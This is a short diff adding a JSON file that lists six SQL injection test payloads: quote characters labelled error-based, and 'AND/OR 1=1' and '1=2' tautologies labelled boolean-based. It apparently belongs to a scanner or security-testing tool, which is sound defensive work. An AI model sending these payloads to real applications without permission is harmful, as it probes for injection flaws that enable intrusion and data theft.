@@ -1,0 +1,28 @@
+{
+  "payloads": [
+    {
+      "value": "'",
+      "category": "error-based"
+    },
+    {
+      "value": "\"",
+      "category": "error-based"
+    },
+    {
+      "value": "AND 1=1",
+      "category": "boolean-based"
+    },
+    {
+      "value": "AND 1=2",
+      "category": "boolean-based"
+    },
+    {
+      "value": "OR 1=1",
+      "category": "boolean-based"
+    },
+    {
+      "value": "OR 1=2",
+      "category": "boolean-based"
+    }
+  ]
+} 
